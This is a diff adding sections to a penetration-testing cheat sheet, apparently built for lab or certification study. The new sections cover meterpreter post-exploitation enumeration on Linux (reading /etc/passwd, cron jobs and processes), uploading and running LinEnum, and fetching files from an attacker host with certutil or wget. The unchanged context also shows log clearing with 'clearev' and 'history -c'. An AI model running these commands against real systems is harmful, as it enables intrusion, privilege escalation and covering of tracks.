@@ -44,6 +44,99 @@ history -c
 meterpreter > clearev
 ```
 
+## Linux Local Enumeration
+- Enumerating System Information
+```
+meterpreter > sysinfo
+
+hostname
+cat /etc/issue && cat /etc/*release
+uname -a
+uname -r
+env
+lscpu
+free -h
+df -h
+lsblk
+dpkg -l
+cat /etc/shells
+```
+
+- Enumerating Users & Groups
+```
+meterpreter > getuid
+
+id
+cat /etc/passwd
+ls -l /home
+groups
+groups <username>
+who
+w
+last
+lastlog
+```
+- `uid=0` is root.
+
+- Enumerating Network Information
+```
+meterpreter > ifconfig
+meterpreter > netstat
+meterpreter > route
+meterpreter > arp
+
+ip a s
+arp -a
+cat /etc/networks
+cat /etc/hostname
+cat /etc/hosts
+cat /etc/resolv.conf
+```
+
+- Enumerating Processes & Cron Jobs
+```
+meterpreter > ps
+meterpreter > ps -S <process_name>
+meterpreter > pgrep <process_name>
+
+ps --help all
+ps
+ps aux
+ps aux | grep root
+ps aux | grep <process_name>
+ps aux | grep -i <keyword>
+top
+crontab -l
+crontab -l -u <username>
+ls -al /etc/cron*
+cat /etc/crontab
+cat /etc/cron*
+```
+
+- Automating Linux Local Enumeration 
+```
+use post/linux/gather/enum_configs
+use post/linux/gather/enum_network
+use post/linux/gather/enum_system  
+use post/linux/gather/checkvm
+
+cat /root/.msf4/loot/<filename>.txt
+```
+- Post-exploitation modules need to `set SESSION <session_id>`.
+
+- LinEnum
+```
+meterpreter > cd /tmp
+meterpreter > upload /root/linenum.sh
+meterpreter > ls
+meterpreter > shell
+
+/bin/bash -i
+chmod +x linenum.sh
+./linenum.sh
+```
+- https://github.com/rebootuser/LinEnum
+
 ## Pivoting
 ```
 meterpreter > ipconfig
@@ -82,6 +175,16 @@ sudo -l
 ```
 find / -user root -perm -4000 -exec ls -ldb {} \;
 ```
+
+## Transfer Files
+- Set Up A Web Server With Python
+```
+python -m SimpleHTTPServer 80
+python3 -m http.server 80
+```
+- Windows: `certutil -urlcache -f http://<ip>/<filename> <filename>`
+- Linux: `wget http://<ip>/<filename>`
+
 
 ## Upgrade Shells
 - Non-interactive to interactive
